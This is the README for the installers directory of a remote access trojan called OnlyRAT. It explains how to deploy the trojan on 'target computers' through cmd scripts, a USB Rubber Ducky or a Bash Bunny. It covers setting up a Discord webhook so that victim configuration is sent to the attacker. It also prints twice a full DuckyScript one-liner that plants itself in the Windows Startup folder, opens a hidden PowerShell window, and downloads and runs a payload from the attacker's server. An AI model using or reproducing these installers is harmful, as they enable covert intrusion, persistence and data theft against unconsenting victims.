# Installers
This directory contains all the installers we can use to install the OnlyRAT tool on our target computers. 

## Creating a discord webhook
1. create a discord server by clicking the plus button in the bottom left
![Create Server](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/create-server.png)
2. go into the `integrations` section in the server's settings
3. click `Webhooks`
![Integrations](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/integrations.png)
4. create a new webhook by clicking `New Webhook`
5. click `Copy Webhook URL` to copy the webhook URL
![Webhook](https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/assets/webhook.png)

## from-github.cmd
This is the default installer that most users will use to install OnlyRAT. This installer installs OnlyRAT from GitHub's raw data, allowing no user configuration. But the **connection can only be local** since there is no VPS to route traffic and forward ports from. Uses a discord webhook to send the configuration file back to the attacker. 

**Setup:**
1. In line 5 of `from-github.cmd`, replace `DISCORDWEBHOOK` with the webhook URL 
```bat
echo DISCORDWEBHOOK > lawFvVTikZ.txt
```

## from-vps.cmd
This installer will be favorited by security researchers, system administrators, and others. This installer utilizes a Virtual Private Server (VPS) or any computer accessible on the internet to route traffic to and from. Meaning with this installer, you can **access your target from anywhere**.

**Setup:**
1. Install OnlyRAT to your attacker computer
2. In a bash terminal, run:
```bash
onlyrat --setup
# or
onlyrat -s
```
    - This will take you through the process of setting up your VPS and attacker computer
3. On line 2 of `from-vps.cmd`, change `X.X.X.X` to your VPS IP Address or domain
```bat
set "EcSjRhAguo=X.X.X.X"
```
4. Deploy

## onlyduck-github.txt
This is an installer for OnlyRAT that uses the [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe). This installer installs OnlyRAT from GitHub's raw data, allowing no user configuration. But the **connection can only be local** since there is no VPS to route traffic and forward ports from.

**Setup:**
1. In line 5 of `from-github.cmd`, replace `DISCORDWEBHOOK` with the webhook URL 
```bat
echo DISCORDWEBHOOK > lawFvVTikZ.txt
```
2. Encode
3. Load
4. Deploy

## onlyduck-vps.txt
This is an installer for OnlyRAT that uses the [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe). This installer utilizes a Virtual Private Server (VPS) or any computer accessible on the internet to route traffic to and from. Meaning with this installer, you can **access your target from anywhere**.

**Setup:**
1. Install OnlyRAT to your attacker computer
2. In a bash terminal, run:
```bash
onlyrat --setup
# or
onlyrat -s
```
    - This will take you through the process of setting up your VPS and attacker computer
3. On line 11 of `onlyduck-vps.txt`, change `X.X.X.X` to your VPS IP Address or domain
```bat
STRING cmd /c set "EcSjRhAguo=X.X.X.X" && set "XNjFYKECht=%cd%" && set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" && cd %YKHfpmMRoQ% && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && cd "%XNjFYKECht%"
```
4. Load
5. Encode
6. Deploy

## OnlyBUGS-github
This is an installer for OnlyRAT that uses the [Bash Bunny](https://shop.hak5.org/products/bash-bunny). This installer installs OnlyRAT from GitHub's raw data, allowing no user configuration. But the **connection can only be local** since there is no VPS to route traffic and forward ports from.

**Setup:**
1. In line 5 of `from-github.cmd`, replace `DISCORDWEBHOOK` with the webhook URL 
```bat
echo DISCORDWEBHOOK > lawFvVTikZ.txt
```
2. Load
3. Deploy

## OnlyBUGS-vps
This is an installer for OnlyRAT that uses the [Bash Bunny](https://shop.hak5.org/products/bash-bunny). This installer utilizes a Virtual Private Server (VPS) or any computer accessible on the internet to route traffic to and from. Meaning with this installer, you can **access your target from anywhere**.

**Setup:**
1. Install OnlyRAT to your attacker computer
2. In a bash terminal, run:
```bash
onlyrat --setup
# or
onlyrat -s
```
    - This will take you through the process of setting up your VPS and attacker computer
3. On line 11 of `duckyscript.txt`, change `X.X.X.X` to your VPS IP Address or domain
```bat
STRING cmd /c set "EcSjRhAguo=X.X.X.X" && set "XNjFYKECht=%cd%" && set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" && cd %YKHfpmMRoQ% && powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri http://%EcSjRhAguo%/onlyrat/payloads/v1.cmd -OutFile wEaoFkNduy.cmd" && powershell ./wEaoFkNduy.cmd && cd "%XNjFYKECht%"
```
4. Load
5. Deploy